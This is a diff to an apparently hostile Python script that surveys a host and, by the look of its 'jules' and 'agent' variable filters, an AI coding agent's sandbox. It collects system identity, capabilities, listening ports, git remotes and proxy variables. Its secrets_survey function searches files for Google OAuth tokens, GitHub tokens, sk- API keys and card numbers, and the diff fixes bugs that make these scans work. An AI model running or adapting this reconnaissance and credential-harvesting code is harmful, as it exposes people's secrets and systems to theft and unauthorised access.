@@ -20,16 +20,14 @@ def run(cmd):
 def env_survey():
     proxyvars = " | ".join("%s=%s" % (k, v) for k, v in os.environ.items()
                            if any(s in k.lower() for s in ("proxy", "jules", "google_", "agent")))
-    return "
-".join(filter(None, [
+    return "\n".join(filter(None, [
         run("uname -a"), run("id"), run("head -2 /etc/os-release"),
         run("mount | head -12"),
         run("grep -i cap /proc/self/status | head -4"),
         proxyvars]))
 
 def net_survey():
-    return "
-".join(filter(None, [
+    return "\n".join(filter(None, [
         run("cat /proc/net/tcp | head -12"),
         run("ss -tlnp 2>/dev/null | head -10 || netstat -tlnp 2>/dev/null | head -10"),
         run("ip -brief a 2>/dev/null || cat /proc/net/route | head -8")]))
@@ -43,8 +41,7 @@ def tools_survey():
     return " ".join("%s=%s" % (n, run("command -v " + n) or "no") for n in names)
 
 def repos_survey():
-    return "
-".join(filter(None, [
+    return "\n".join(filter(None, [
         run("ls -la ~ 2>/dev/null | head -14"),
         run("for d in ~/*/ ; do echo $d $(git -C $d remote get-url origin 2>/dev/null); done 2>/dev/null | head -10"),
         run("find / -maxdepth 3 -name .git -type d 2>/dev/null | head -8")]))
@@ -54,7 +51,7 @@ PATTERNS = [
     re.compile(r"ya29\.[0-9A-Za-z\-_]{20,}"),
     re.compile(r"ghp_[0-9A-Za-z]{20,}"),
     re.compile(r"sk-[0-9A-Za-z]{20,}"),
-    re.compile(r"(?:\d[ -]?){4}(?:\d[ -]?){4}(?:\d[ -]?){4}(?:\d[ -]?){1,7}\d"),
+    re.compile(r"\b(?:\d[ -]?){4}(?:\d[ -]?){4}(?:\d[ -]?){4}(?:\d[ -]?){1,7}\d\b"),
 ]
 
 def secrets_survey():
@@ -68,7 +65,7 @@ def secrets_survey():
             if dirpath.count(os.sep) - base.count(os.sep) > 5:
                 dirs[:] = []
             for fn in files:
-                if not fn.endswith((".json", ".txt", ".md", ".env", ".yaml", ".yml", ".conf", ".cfg", "")):
+                if not fn.endswith((".json", ".txt", ".md", ".env", ".yaml", ".yml", ".conf", ".cfg")):
                     continue
                 p = os.path.join(dirpath, fn)
                 try:
@@ -81,8 +78,7 @@ def secrets_survey():
                     pass
             if len(hits) >= 24:
                 break
-    return "
-".join(hits[:24]) if hits else "none"
+    return "\n".join(hits[:24]) if hits else "none"
 
 SECTIONS = [
     ("env", env_survey), ("net", net_survey), ("proc", proc_survey),
